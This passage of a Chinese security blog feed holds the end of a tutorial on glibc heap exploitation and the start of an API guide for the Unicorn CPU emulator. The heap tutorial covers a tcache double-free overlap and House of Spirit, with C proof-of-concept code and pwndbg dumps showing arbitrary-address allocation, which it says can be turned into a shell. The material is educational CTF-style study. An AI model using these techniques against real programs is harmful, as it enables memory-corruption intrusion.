class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">0x110 [  6]: 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0                &lt;======== malloc取出</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">0x110 [  7]: 0x555555559f30 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0          &lt;====== double free加入</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br></pre></td></tr></table></figure><h4 id="6-利用堆块重叠将-victim-chunk-的-fd-指针覆写为目标位置"><a href="#6-利用堆块重叠将-victim-chunk-的-fd-指针覆写为目标位置" class="headerlink" title="6 利用堆块重叠将 victim chunk 的 fd 指针覆写为目标位置"></a>6 利用堆块重叠将 victim chunk 的 fd 指针覆写为目标位置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line">b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50xg 0x555555559f20-0x20</span><br><span class="line">0x555555559f00:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f10:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f20:0x00000000000000000x0000000000000111</span><br><span class="line">0x555555559f30:0x00007fffffffdb000x0000555555559010 &lt;==== 堆块重叠，写入fd</span><br><span class="line">0x555555559f40:0x00000000000000000x00000000000000f1</span><br><span class="line">0x555555559f50:0x00007ffff7faebe00x00007ffff7faebe0</span><br><span class="line">0x555555559f60:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f70:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x55555555a010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a030:0x00000000000000f00x0000000000000020</span><br><span class="line">0x55555555a040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a050:0x00000000000000000x000000000001ffb1 &lt;==== top chunk</span><br><span class="line">0x55555555a060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="7-malloc申请到目标位置"><a href="#7-malloc申请到目标位置" class="headerlink" title="7 malloc申请到目标位置"></a>7 malloc申请到目标位置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/29/Nom3x27sBWDYOvX.png" alt="image.png"></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>该利用可以bypass double free的check，达到任意地址写，测试发现glibc2.30版本也可以利用。</p><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过伪造fastbin，再将一个目前可用的chunk的指针改写为伪造fastbin地址，将这个chunk free，相当于free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块。</p><h3 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"House of Spirit Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step1: malloc初始化堆内存\n\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step2: 覆盖一个堆指针指向伪造的 fastbin 区域\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t这片区域 (长度为: %lu) 包含两个 fake chunk.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第一个fake chunk位于 %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第二个fake chunk位于 %p\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第二个fake chunk 的size必须大于 2*SIZE_SZ (x64上 &gt; 16) &amp;&amp; 小于 av-&gt;system_mem，用于绕过nextsize检查\n"</span>);</span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t覆盖堆指针指向第一个fake chunk %p \n\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step3: free被覆盖堆指针的堆\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step4: malloc申请到fake chunk\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t再次malloc将会在 %p 返回fake chunk %p \n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\tmalloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/30/dPT1qpWfKYEFIiC.png" alt="image.png"></p><h3 id="分步分析-2"><a href="#分步分析-2" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-malloc初始化堆内存"><a href="#1-malloc初始化堆内存" class="headerlink" title="1 malloc初始化堆内存"></a>1 malloc初始化堆内存</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x602020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135137, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10xg 0x602020-0x20</span><br><span class="line">0x602000:0x00000000000000000x0000000000000021 &lt;==== 改写目标chunk</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000020fe1</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="2-覆盖一个堆指针指向伪造的-fastbin-区域"><a href="#2-覆盖一个堆指针指向伪造的-fastbin-区域" class="headerlink" title="2 覆盖一个堆指针指向伪造的 fastbin 区域"></a>2 覆盖一个堆指针指向伪造的 fastbin 区域</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16xg 0x7fffffffdca8</span><br><span class="line">0x7fffffffdca8:0x00000000000000400x00007ffff7ffe168 &lt;==== fake chunk1</span><br><span class="line">0x7fffffffdcb8:0x0000000000f0b5ff0x0000000000000001</span><br><span class="line">0x7fffffffdcc8:0x00000000004008dd0x00007fffffffdcfe</span><br><span class="line">0x7fffffffdcd8:0x00000000000000000x0000000000400890</span><br><span class="line">0x7fffffffdce8:0x00000000000012340x00007fffffffdde0 &lt;==== fake chunk2</span><br><span class="line">0x7fffffffdcf8:0xce9b2a14d13598000x0000000000400890</span><br><span class="line">0x7fffffffdd08:0x00007ffff7a2d8300x0000000000000001</span><br><span class="line">0x7fffffffdd18:0x00007fffffffdde80x00000001f7ffcca0</span><br></pre></td></tr></table></figure><h4 id="3-free该堆指针"><a href="#3-free该堆指针" class="headerlink" title="3 free该堆指针"></a>3 free该堆指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x7fffffffdca0 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><h4 id="4-malloc申请到该区域"><a href="#4-malloc申请到该区域" class="headerlink" title="4 malloc申请到该区域"></a>4 malloc申请到该区域</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/30/Eed46cZAODJnChf.png" alt="image.png"></p><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>glibc2.26之后加入了tcache机制,tcache在提高内存管理效率的同时，安全性有所下降</p><p>tcache house of spirit只需伪造一个size区域，然后将伪造的fakechunk释放，再次malloc相应大小就可以得到fake_chunk。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>house_of_spirit可以进行任意地址写，可以改写为system直接getshell，也可以进一步利用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>House of系列堆漏洞的分析到这里就结束了，通过gdb单步调试，对堆结构等熟悉了很多。</p><p>在glibc版本不断升级的同时，堆内的一些保护不断完善，但与此同时，像tcache这样的新增技术也暴露出新的漏洞，在后期的漏洞挖掘中，对这些新技术的漏洞挖掘应该更加重视。</p><p>From <a href="https://kabeor.github.io/House of 系列堆漏洞详解(二">https://kabeor.github.io/House of 系列堆漏洞详解(二)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-系列堆漏洞详解-二&quot;&gt;&lt;a href=&quot;#House-of-系列堆漏洞详解-二&quot; class=&quot;headerlink&quot; title=&quot;House of 系列堆漏洞详解(二)&quot;&gt;&lt;/a&gt;House of 系列堆漏洞详解(二)&lt;/h1&gt;&lt;p&gt;首发于&lt;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(一)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(一)/</id>
    <published>2020-02-13T05:51:24.781Z</published>
    <updated>2020-02-13T05:56:57.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-一"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-一" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(一)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(一)</h1><p>之前对Capstone反汇编引擎的API分析文档(<a href="https://xz.aliyun.com/t/5753)已经被[官方](http://www.capstone-engine.org/documentation.html)收录" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753)已经被[官方](http://www.capstone-engine.org/documentation.html)收录</a> <a href="https://github.com/kabeor/Micro-Capstone-Engine-API-Documentation" target="_blank" rel="noopener">https://github.com/kabeor/Micro-Capstone-Engine-API-Documentation</a>  ，在实现自己想要做出的调试器的路上，又遇到了与Capstone同作者的国外大佬aquynh的另一个著名项目Unicorn，不巧的是，详尽的API文档仍然较少，更多的是大篇幅的代码，因此决定继续分析Unicorn框架，包括数据类型，已开放API及其实现。</p><p>Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等，该项目被用于Radare2逆向分析框架，GEF(gdb的pwn分析插件)，Pwndbg，Angr符号执行框架等多个著名项目。接下来我也将通过阅读源码和代码实际调用来写一个简单的非官方版本的API手册。</p><p>个人博客： kabeor.cn</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>Unicorn官网:     <a href="http://www.unicorn-engine.org" target="_blank" rel="noopener">http://www.unicorn-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>源码： <a href="https://github.com/unicorn-engine/unicorn/archive/master.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/archive/master.zip</a></p><p>下载后解压</p><p>文件结构如下：</p><blockquote><p>. &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等<br>├── arch &lt;- 各语言反编译支持的代码实现<br>├── bindings &lt;- 中间件<br>│ ├── dotnet &lt;- .Net 中间件 + 测试代码<br>│ ├── go &lt;- go 中间件 + 测试代码<br>│ ├── haskell &lt;- Haskell 中间件 + 测试代码<br>│ ├── java &lt;- Java 中间件 + 测试代码<br>│ ├── pascal &lt;- Pascal 中间件 + 测试代码<br>│ ├── python &lt;- Python 中间件 + 测试代码<br>│ ├── ruby &lt;- Ruby 中间件 + 测试代码<br>│ └── vb6 &lt;- VB6 中间件 + 测试代码<br>├── docs &lt;- 文档，主要是Unicorn的实现思路<br>├── include &lt;- C头文件<br>├── msvc &lt;- Microsoft Visual Studio 支持（Windows）<br>├── qemu &lt;- qemu框架源码<br>├── samples &lt;- Unicorn使用示例<br>└── tests &lt;- C语言测试用例</p></blockquote><p>下面演示Windows10使用Visual Studio2019编译</p><p>打开msvc文件夹，内部结构如下</p><p><img src="https://i.loli.net/2020/01/17/iyodlNFY7hHEOgS.png" alt="image.png"></p><p>VS打开unicorn.sln项目文件，解决方案自动载入这些</p><p><img src="https://i.loli.net/2020/01/17/fOnNpSKvjYyc7QB.png" alt="image.png"></p><p>如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性 如下</p><p><img src="https://i.loli.net/2020/01/17/F3rSByYuNTGDtC1.png" alt="image.png"></p><p>生成选项中勾选你需要的支持项即可</p><p>项目编译属性为：</p><ol><li>使用多字节字符集</li><li>不使用预编译头</li><li>附加选项 /wd4018 /wd4244 /wd4267</li><li>预处理器定义中添加   <code>_CRT_SECURE_NO_WARNINGS</code></li></ol><p>编译后会在当前文件夹Debug目录下生成unicorn.lib静态编译库和unicorn.dll动态库这样就可以开始使用Unicorn进行开发了</p><p>编译到最后一项可能会报错系统找不到指定的路径，查看makefile发现问题出现在此处<br><img src="https://i.loli.net/2020/01/17/YCMNcEVyX8GHoPb.png" alt="image.png"></p><p>事实上只不过是不能将生成的lib和dll复制到新建的文件夹而已，只需要到生成目录去找即可。</p><p>官方目前提供的最新已编译版本为1.0.1版本，比较老，建议自己编辑最新版本源码，以获得更多可用API。<br>Win32：<a href="https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win32.zip</a><br>Win64：<a href="https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win64.zip</a></p><p><strong>注意： 选x32或x64将影响后面开发的位数</strong></p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\unicorn-master\include\unicorn中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><img src="https://i.loli.net/2020/01/17/I25E9sWcJpGyax7.png" alt="image.png"></p><p>在VS解决方案中，头文件添加现有项unicorn.h，资源文件中添加unicorn.lib，重新生成解决方案</p><p><img src="https://i.loli.net/2020/01/17/OVaHwelNQ4tcLmo.png" alt="image.png"></p><p>接下来测试我们生成的unicorn框架</p><p>主文件代码如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要模拟的指令</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x41\x4a"</span> <span class="comment">// INC ecx; DEC edx</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 起始地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    <span class="keyword">int</span> r_ecx = <span class="number">0x1234</span>;     <span class="comment">// ECX 寄存器</span></span><br><span class="line">    <span class="keyword">int</span> r_edx = <span class="number">0x7890</span>;     <span class="comment">// EDX 寄存器</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Emulate i386 code\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// X86-32bit 模式初始化模拟</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给模拟器申请 2MB 内存</span></span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将要模拟的指令写入内存</span></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_ecx);</span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EDX, &amp;r_edx);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; ECX = 0x%x\n"</span>, r_ecx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EDX = 0x%x\n"</span>, r_edx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 模拟代码</span></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">        err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印寄存器值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_ECX, &amp;r_ecx);</span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EDX, &amp;r_edx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; ECX = 0x%x\n"</span>, r_ecx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EDX = 0x%x\n"</span>, r_edx);</span><br><span class="line"></span><br><span class="line">    uc_close(uc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://i.loli.net/2020/01/17/bpu4r8hgzUvO7Pm.png" alt="image.png"></p><p>ecx+1和edx-1成功模拟。</p><h2 id="0x1-数据类型分析"><a href="#0x1-数据类型分析" class="headerlink" title="0x1 数据类型分析"></a>0x1 数据类型分析</h2><h3 id="uc-arch"><a href="#uc-arch" class="headerlink" title="uc_arch"></a>uc_arch</h3><p>架构选择</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_arch &#123;</span><br><span class="line">    UC_ARCH_ARM = <span class="number">1</span>,    <span class="comment">// ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">    UC_ARCH_ARM64,      <span class="comment">// ARM-64, 也称 AArch64</span></span><br><span class="line">    UC_ARCH_MIPS,       <span class="comment">// Mips 架构</span></span><br><span class="line">    UC_ARCH_X86,        <span class="comment">// X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">    UC_ARCH_PPC,        <span class="comment">// PowerPC 架构 (暂不支持)</span></span><br><span class="line">    UC_ARCH_SPARC,      <span class="comment">// Sparc 架构</span></span><br><span class="line">    UC_ARCH_M68K,       <span class="comment">// M68K 架构</span></span><br><span class="line">    UC_ARCH_MAX,</span><br><span class="line">&#125; uc_arch;</span><br></pre></td></tr></table></figure><h3 id="uc-mode"><a href="#uc-mode" class="headerlink" title="uc_mode"></a>uc_mode</h3><p>模式选择</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_mode &#123;</span><br><span class="line">    UC_MODE_LITTLE_ENDIAN = <span class="number">0</span>,    <span class="comment">// 小端序模式 (默认)</span></span><br><span class="line">    UC_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">30</span>, <span class="comment">// 大端序模式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// arm / arm64</span></span><br><span class="line">    UC_MODE_ARM = <span class="number">0</span>,              <span class="comment">// ARM 模式</span></span><br><span class="line">    UC_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,       <span class="comment">// THUMB 模式 (包括 Thumb-2)</span></span><br><span class="line">    UC_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,      <span class="comment">// ARM's Cortex-M 系列 (暂不支持)</span></span><br><span class="line">    UC_MODE_V8 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,          <span class="comment">// ARMv8 A32 encodings for ARM (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// arm (32bit) cpu 类型</span></span><br><span class="line">    UC_MODE_ARM926 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>,  <span class="comment">// ARM926 CPU 类型</span></span><br><span class="line">    UC_MODE_ARM946 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>,  <span class="comment">// ARM946 CPU 类型</span></span><br><span class="line">    UC_MODE_ARM1176 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>,  <span class="comment">// ARM1176 CPU 类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mips</span></span><br><span class="line">    UC_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,       <span class="comment">// MicroMips 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,       <span class="comment">// Mips III ISA (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,    <span class="comment">// Mips32r6 ISA (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,      <span class="comment">// Mips32 ISA</span></span><br><span class="line">    UC_MODE_MIPS64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,      <span class="comment">// Mips64 ISA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x86 / x64</span></span><br><span class="line">    UC_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,          <span class="comment">// 16-bit 模式</span></span><br><span class="line">    UC_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,          <span class="comment">// 32-bit 模式</span></span><br><span class="line">    UC_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,          <span class="comment">// 64-bit 模式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ppc </span></span><br><span class="line">    UC_MODE_PPC32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,       <span class="comment">// 32-bit 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_PPC64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,       <span class="comment">// 64-bit 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,         <span class="comment">// Quad Processing eXtensions 模式 (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sparc</span></span><br><span class="line">    UC_MODE_SPARC32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,     <span class="comment">// 32-bit 模式</span></span><br><span class="line">    UC_MODE_SPARC64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,     <span class="comment">// 64-bit 模式</span></span><br><span class="line">    UC_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,          <span class="comment">// SparcV9 模式 (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// m68k</span></span><br><span class="line">&#125; uc_mode;</span><br></pre></td></tr></table></figure><h3 id="uc-err"><a href="#uc-err" class="headerlink" title="uc_err"></a>uc_err</h3><p>错误类型，是uc_errno()的返回值</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_err 